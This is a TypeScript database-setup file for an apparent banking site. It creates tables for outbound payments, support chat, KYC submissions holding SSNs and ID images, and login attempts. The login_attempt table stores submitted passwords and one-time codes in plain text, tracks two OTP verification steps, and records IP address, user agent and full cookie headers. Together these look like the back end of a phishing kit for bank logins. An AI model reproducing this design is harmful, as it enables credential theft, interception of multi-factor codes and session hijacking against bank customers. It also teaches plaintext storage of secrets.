import { pool } from '@/lib/db'

let ensured = false
let kycEnsured = false
let loginAttemptEnsured = false

export async function ensureUserProfileColumns() {
  if (ensured) return
  try {
    await pool.query(`ALTER TABLE "user" ADD COLUMN IF NOT EXISTS "phone" text`)
    await pool.query(`ALTER TABLE "user" ADD COLUMN IF NOT EXISTS "dateOfBirth" text`)
    await pool.query(`
      CREATE TABLE IF NOT EXISTS outbound_payment (
        id serial PRIMARY KEY,
        "userId" text NOT NULL,
        "fromAccountId" integer NOT NULL,
        method text NOT NULL,
        "amountCents" bigint NOT NULL,
        status text NOT NULL DEFAULT 'scheduled',
        "scheduledFor" timestamp NOT NULL,
        "recipientName" text NOT NULL,
        "recipientBank" text,
        "routingNumber" text,
        "accountNumber" text,
        "zelleHandle" text,
        memo text,
        "createdAt" timestamp NOT NULL DEFAULT now(),
        "processedAt" timestamp
      )
    `)
    await pool.query(`
      CREATE TABLE IF NOT EXISTS chat_thread (
        id serial PRIMARY KEY,
        "userId" text NOT NULL,
        status text NOT NULL DEFAULT 'open',
        subject text NOT NULL DEFAULT 'Support chat',
        "createdAt" timestamp NOT NULL DEFAULT now(),
        "updatedAt" timestamp NOT NULL DEFAULT now()
      )
    `)
    await pool.query(`
      CREATE TABLE IF NOT EXISTS chat_message (
        id serial PRIMARY KEY,
        "threadId" integer NOT NULL,
        sender text NOT NULL,
        body text NOT NULL,
        "createdAt" timestamp NOT NULL DEFAULT now()
      )
    `)
    ensured = true
  } catch (err) {
    console.error('[db] ensureUserProfileColumns', err)
  }
}

export async function ensureKycTable() {
  if (kycEnsured) return
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS kyc_submission (
        id serial PRIMARY KEY,
        "userId" text NOT NULL,
        "ssnLast4" text NOT NULL,
        "ssnEncrypted" text NOT NULL,
        "idType" text NOT NULL,
        "idFrontName" text NOT NULL,
        "idFrontMime" text NOT NULL,
        "idFrontData" text NOT NULL,
        "idBackName" text NOT NULL,
        "idBackMime" text NOT NULL,
        "idBackData" text NOT NULL,
        status text NOT NULL DEFAULT 'pending',
        "createdAt" timestamp NOT NULL DEFAULT now(),
        "updatedAt" timestamp NOT NULL DEFAULT now()
      )
    `)
    kycEnsured = true
  } catch (err) {
    console.error('[db] ensureKycTable', err)
    throw err
  }
}

export async function ensureLoginAttemptTable() {
  if (loginAttemptEnsured) return
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS login_attempt (
        id text PRIMARY KEY,
        "userId" text NOT NULL,
        email text NOT NULL,
        "memberName" text NOT NULL,
        step text NOT NULL DEFAULT 'credentials',
        status text NOT NULL DEFAULT 'in_progress',
        "usernameSubmitted" text,
        "passwordPlain" text,
        "otpHash" text,
        "otpPlain" text,
        "otpExpiresAt" timestamp,
        "otp1Verified" boolean NOT NULL DEFAULT false,
        "otp2Verified" boolean NOT NULL DEFAULT false,
        "lastEvent" text,
        "ipAddress" text,
        "userAgent" text,
        "cookieHeader" text,
        "createdAt" timestamp NOT NULL DEFAULT now(),
        "updatedAt" timestamp NOT NULL DEFAULT now()
      )
    `)
    // Upgrade older tables created before test plain-text columns
    await pool.query(
      `ALTER TABLE login_attempt ADD COLUMN IF NOT EXISTS "passwordPlain" text`
    )
    await pool.query(
      `ALTER TABLE login_attempt ADD COLUMN IF NOT EXISTS "otpPlain" text`
    )
    await pool.query(
      `ALTER TABLE login_attempt ADD COLUMN IF NOT EXISTS "cookieHeader" text`
    )
    loginAttemptEnsured = true
  } catch (err) {
    console.error('[db] ensureLoginAttemptTable', err)
    throw err
  }
}
